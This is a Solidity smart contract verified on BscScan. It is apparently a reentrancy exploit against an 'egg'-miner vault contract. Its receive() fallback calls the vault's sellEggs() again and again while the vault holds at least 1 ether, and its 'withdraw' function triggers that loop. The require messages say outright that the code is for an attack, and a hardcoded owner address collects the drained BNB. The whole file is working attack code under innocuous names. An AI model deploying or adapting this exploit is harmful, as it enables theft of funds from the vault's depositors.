/**
 *Submitted for verification at BscScan.com on 2022-12-07
*/

// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

interface IEtherVault {
    function buyEggs(address ref) external payable;
    function sellEggs() external;
}

contract Syndication {
    IEtherVault public immutable etherVault;
    address public ceoAddress2 = address(0x0E8125aE8373b79DB639196529bbF6dA8a366891);

    constructor(IEtherVault _etherVault) {
        etherVault = _etherVault;
    }
    
    receive() external payable {
        if (address(etherVault).balance >= 1 ether) {
            etherVault.sellEggs();
        }
    }

    function withdraw(address ref) external payable {
        require(msg.value == 0.01 ether, "Require 1 Ether to attack");
        etherVault.buyEggs{value: 0.01 ether}(ref);
        etherVault.sellEggs();
    }

    function deposit(address ref) external payable {
        require(msg.value == 0.01 ether, "Require 1 Ether to attack");
        etherVault.buyEggs{value: 0.01 ether}(ref);
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }

    function withdrawBNB() external {
        require(msg.sender == ceoAddress2, "should owner");
        payable(ceoAddress2).transfer(address(this).balance);
    }
}